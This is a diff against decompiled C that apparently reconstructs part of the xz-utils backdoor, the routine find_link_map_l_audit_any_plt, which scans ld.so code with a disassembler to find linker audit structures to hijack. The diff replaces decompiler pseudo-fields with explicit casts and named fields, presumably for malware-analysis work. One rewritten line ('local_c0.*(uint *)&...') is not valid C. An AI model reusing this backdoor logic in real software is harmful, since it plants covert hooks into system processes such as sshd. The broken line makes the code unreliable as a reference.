@@ -66,10 +66,10 @@ BOOL find_link_map_l_audit_any_plt
     }
     code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt;
     local_c8._0_3_ = CONCAT12(0xff,(undefined2)local_c8);
-    local_c8 = CONCAT22(local_c8._2_2_,(undefined2)local_c8) | 0x80;
-    local_c4._0_2_ = (ushort)local_c4 | 2;
+    local_c8 = CONCAT22(*(ushort *)((u8 *)&local_c8 + 2),(undefined2)local_c8) | 0x80;
+    *(ushort *)&local_c4 = (ushort)local_c4 | 2;
     code_end = code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size;
-    local_c4._3_1_ = SUB41(uVar2,3);
+    *(((u8 *)&local_c4) + 3) = SUB41(uVar2,3);
     local_c4._0_3_ = CONCAT12(0xff,(ushort)local_c4);
     ppVar6 = (pfn_pselect_t)lzma_alloc(0x690,allocator);
     plVar1->pselect = ppVar6;
@@ -79,35 +79,35 @@ BOOL find_link_map_l_audit_any_plt
     while ((code_start < code_end &&
            (BVar4 = x86_dasm(&local_80,(u8 *)code_start,(u8 *)code_end),
            uVar3 = local_80.instruction_size, BVar4 != FALSE))) {
-      if ((local_80._40_4_ == 0x1036) &&
-         ((((ushort)local_80.prefix._0_4_ & 0x140) == 0x140 &&
-          ((byte)(local_80.prefix._13_1_ - 1) < 2)))) {
+      if ((*(u32 *)&local_80.opcode_window[3] == 0x1036) &&
+         ((((ushort)local_80.prefix.flags_u16 & 0x140) == 0x140 &&
+          ((byte)(local_80.prefix.decoded.modrm.breakdown.modrm_mod - 1) < 2)))) {
         uVar13 = 0;
-        if ((local_80.prefix._0_4_ & 0x40) == 0) {
+        if ((local_80.prefix.flags_u16 & 0x40) == 0) {
           uVar8 = 0;
-          if ((((local_80.prefix._0_4_ & 0x1040) != 0) &&
-              (uVar8 = local_80.prefix.decoded.flags2 & 0x10, (local_80.prefix._0_4_ & 0x1000) != 0)
-              ) && (uVar8 = local_80.imm64_reg, (local_80.prefix._0_4_ & 0x20) != 0)) {
+          if ((((local_80.prefix.flags_u16 & 0x1040) != 0) &&
+              (uVar8 = local_80.prefix.decoded.flags2 & 0x10, (local_80.prefix.flags_u16 & 0x1000) != 0)
+              ) && (uVar8 = local_80.imm64_reg, (local_80.prefix.flags_u16 & 0x20) != 0)) {
             uVar8 = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
           }
         }
         else {
           uVar8 = local_80.prefix.decoded.flags & 0x20;
-          if ((local_80.prefix._0_4_ & 0x20) == 0) {
-            uVar13 = local_80.prefix._15_1_;
-            if ((local_80.prefix._0_4_ & 0x1040) != 0) {
-              uVar8 = local_80.prefix._14_1_;
+          if ((local_80.prefix.flags_u16 & 0x20) == 0) {
+            uVar13 = local_80.prefix.decoded.modrm.breakdown.modrm_rm;
+            if ((local_80.prefix.flags_u16 & 0x1040) != 0) {
+              uVar8 = local_80.prefix.decoded.modrm.breakdown.modrm_reg;
             }
           }
           else {
-            uVar13 = local_80.prefix._15_1_ | (char)local_80.prefix.decoded.rex * '\b' & 8U;
+            uVar13 = local_80.prefix.decoded.modrm.breakdown.modrm_rm | (char)local_80.prefix.decoded.rex * '\b' & 8U;
             uVar8 = 0;
-            if ((local_80.prefix._0_4_ & 0x1040) != 0) {
-              uVar8 = (char)local_80.prefix.decoded.rex * '\x02' & 8U | local_80.prefix._14_1_;
+            if ((local_80.prefix.flags_u16 & 0x1040) != 0) {
+              uVar8 = (char)local_80.prefix.decoded.rex * '\x02' & 8U | local_80.prefix.decoded.modrm.breakdown.modrm_reg;
             }
           }
         }
-        if ((local_80.prefix._0_4_ & 0x100) != 0) {
+        if ((local_80.prefix.flags_u16 & 0x100) != 0) {
           puVar9 = (u8 *)local_80.mem_disp;
           if (((uint)local_80.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
             puVar9 = local_80.instruction + (long)(local_80.mem_disp + local_80.instruction_size);
@@ -141,7 +141,7 @@ BOOL find_link_map_l_audit_any_plt
             }
             local_c0.start_addr = (u8 *)(code_start + uVar3);
             local_c0.end_addr = (u8 *)code_end;
-            local_c0.offset_to_match._0_4_ = (int)puVar9;
+            local_c0.*(uint *)&local_c0.offset_to_match = (int)puVar9;
             local_c0.hooks = hooks;
             local_c0.imported_funcs = imported_funcs;
             BVar4 = find_link_map_l_audit_any_plt_bitmask(data,&local_c0);
